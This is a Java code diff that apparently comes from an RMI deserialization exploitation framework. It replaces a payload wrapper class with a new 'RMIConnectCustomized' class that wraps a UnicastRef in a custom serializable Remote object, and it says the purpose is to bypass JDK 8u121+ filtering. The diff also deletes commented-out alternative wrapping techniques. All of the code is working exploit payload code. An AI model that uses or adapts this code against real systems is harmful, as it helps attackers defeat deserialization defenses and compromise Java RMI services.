@@ -20,9 +20,17 @@ import java.rmi.server.RemoteRef;
 @SuppressWarnings({"rawtypes"})
 @Payloads
 @Require(bullets = {"RMIConnectBullet"}, param = false)
-@Dependencies({"using to bypass jdk>=8u121","wrapped with RMIConnectionImpl_Stub object"})
-@Authors({ Authors.WH1T3P1G })
-public class RMIConnectWrapped extends Payload<Remote> {
+@Dependencies({"using to bypass jdk>=8u121","wrapped with Customized object"})
+@Authors({ Authors.LALA })
+public class RMIConnectCustomized extends Payload<Remote> {
+
+    public static class CustomizedRemote implements Remote, java.io.Serializable {
+        private RemoteRef ref;
+
+        public CustomizedRemote(UnicastRef remoteref) throws Throwable {
+            ref=remoteref;
+        }
+    }
 
     @Override
     public boolean checkObject(Object obj) {
@@ -40,20 +48,11 @@ public class RMIConnectWrapped extends Payload<Remote> {
 
     @Override
     public Remote pack(Object obj) throws Exception {
-        // also ok
-        // RMIServerImpl_Stub OK
-        // RegistryImpl_Stub OK
-        // DGCImpl_Stub OK
-        // ReferenceWrapper_Stub
-        // UnicastRemoteObject OK
-            // 获取到UnicastRemoteObject的实例
-            // Class clazz = Class.forName("java.rmi.server.UnicastRemoteObject");
-            // Constructor m = clazz.getDeclaredConstructor();
-            // m.setAccessible(true);
-            // UnicastRemoteObject UnicastRemoteObject_obj =(UnicastRemoteObject)m.newInstance();
-            // 修改实例的ref参数（使用yso中的模块）
-            // ReflectionHelper.setFieldValue(UnicastRemoteObject_obj,"ref",(RemoteRef)obj);
-            // return UnicastRemoteObject_obj;
-        return new RMIConnectionImpl_Stub((RemoteRef) obj);
+        try {
+            return new CustomizedRemote((UnicastRef) obj);
+        } catch (Throwable throwable) {
+            throwable.printStackTrace();
+        }
+        return null;
     }
 }
